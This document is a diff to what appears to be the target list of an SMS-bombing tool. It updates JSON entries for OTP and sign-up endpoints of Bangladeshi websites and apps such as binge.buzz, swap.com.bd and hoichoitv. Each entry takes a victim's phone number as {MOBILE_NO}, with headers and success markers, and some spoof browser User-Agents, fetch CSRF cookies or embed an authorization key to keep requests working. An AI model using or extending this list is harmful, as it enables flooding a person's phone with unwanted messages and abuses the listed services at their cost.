@@ -42,7 +42,7 @@
     },
     "identifier": "\"message\":\"success\""
 }, {
-    "unlimited": true,
+    "unlimited": false,
     "url": "https://shijang.com/c-sign-up",
     "method": "post",
     "data": "c_name=Hshsbdb&c_contact_number=0{MOBILE_NO}&c_account_type=Personal&c_business_name=",
@@ -59,15 +59,6 @@
         "Content-Type": "application/json"
     },
     "identifier": "Please verify"
-}, {
-    "unlimited": true,
-    "url": "https://api.miah.shop/api/otp",
-    "method": "post",
-    "data": "{\"phone\":\"0{MOBILE_NO}\",\"email\":\"tywuqbcuv\"}",
-    "headers": {
-        "Content-Type": "application/json"
-    },
-    "identifier": "\"status\":true"
 }, {
     "unlimited": false,
     "url": "https://www.bioscopelive.com/en/login/send-otp?phone=880{MOBILE_NO}&operator=bd-otp",
@@ -94,24 +85,24 @@
     },
     "identifier": ""
 }, {
-    "unlimited": false,
-    "url": "https://web-api.binge.buzz/api/v3/otp/send/login",
-    "method": "post",
-    "data": "{\"phone\":\"+880{MOBILE_NO}\"}",
+    "unlimited": true,
+    "url": "https://web-api.binge.buzz/api/v3/otp/send/+880{MOBILE_NO}",
+    "method": "get",
+    "data": "",
     "headers": {
         "Device-Type": "web",
-        "Content-Type": "application/json"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"
     },
-    "identifier": "OTP sent successfully"
+    "identifier": "\"is_success\":true"
 }, {
     "unlimited": true,
-    "url": "https://www.chinaexpress.com.bd/admin/api/v1/check-exists-customer",
+    "url": "https://api.chinaexpress.com.bd/api/v1/check-exists-customer",
     "method": "post",
     "data": "{\"phone\":\"+880{MOBILE_NO}\"}",
     "headers": {
         "Content-Type": "application/json"
     },
-    "identifier": "OTP send to your phone"
+    "identifier": "\"status\":true"
 }, {
     "unlimited": false,
     "url": "https://api.bongo-solutions.com/auth/api/login/send-otp",
@@ -148,6 +139,13 @@
     "identifier": "OTP has been sent"
 }, {
     "unlimited": true,
+    "url": "https://daktarbhai.com/login/mobile",
+    "method": "post",
+    "data": "mobile=0{MOBILE_NO}",
+    "headers": {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "FETCH_COOKIE", "X-CSRF-TOKEN": "FETCH_COOKIE"},
+    "identifier": "STATUS 200 & RESP EMPTY"
+}, {
+    "unlimited": true,
     "url": "https://api.munchies.com.bd/parse/functions/generateOtp",
     "method": "post",
     "data": "{\"phone\":\"0{MOBILE_NO}\"}",
@@ -158,7 +156,7 @@
     "url": "https://prodapi.swap.com.bd/api/v1/send-otp/login",
     "method": "post",
     "data": "{\"mobile_number\":\"0{MOBILE_NO}\"}",
-    "headers": {"Content-Type":"application/json", "x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"},
+    "headers": {"Content-Type":"application/json", "x-authorization":"QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"},
     "identifier": "\"success\":true"
 }, {
     "unlimited": false,
@@ -167,6 +165,13 @@
     "data": "{\"username\":\"+880{MOBILE_NO}\"}",
     "headers": {"Content-Type":"application/json"},
     "identifier": "session"
+}, {
+    "unlimited": false,
+    "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
+    "method": "post",
+    "data": "{\"requestType\":\"send\",\"phoneNumber\":\"+880{MOBILE_NO}\",\"emailConsent\":false,\"whatsappConsent\":false}",
+    "headers": {"Content-Type":"application/json"},
+    "identifier": "\"sent\":\"true\""
 }, {
     "unlimited": true,
     "url": "https://sonamoni.com/index.php?route=extension%2Fmodule%2Fxsmsprohelper%2Fcommonlogin%2Fexists",
@@ -189,13 +194,6 @@
     "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"},
     "identifier": "SMS sent"
 }, {
-    "unlimited": true,
-    "url": "https://gateway.drobboo.com/core/api/v1/customer/sign-up",
-    "method": "post",
-    "data": "{\"firstName\":\"Bdbdbdb\",\"lastName\":\"Djjdbdbdb\",\"countryCode\":\"+880\",\"password\":\"Abc12345\",\"phoneNumber\":\"{MOBILE_NO}\"}",
-    "headers": {"Content-Type":"application/json"},
-    "identifier": "Success"
-}, {
     "unlimited": false,
     "url": "https://farmhouse.com.bd/wp-admin/admin-ajax.php",
     "method": "post",
@@ -216,13 +214,6 @@
         "headers":{"Content-Type":"application/json"},
         "identifier":"User registration successful"
     }
-}, {
-    "unlimited": true,
-    "url": "https://doctorola.com/login_sending_code",
-    "method": "post",
-    "data": "mobile=0{MOBILE_NO}",
-    "headers": {"Content-Type":"application/x-www-form-urlencoded"},
-    "identifier": "OTP code send to your mobile"
 }, {
     "unlimited": false,
     "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
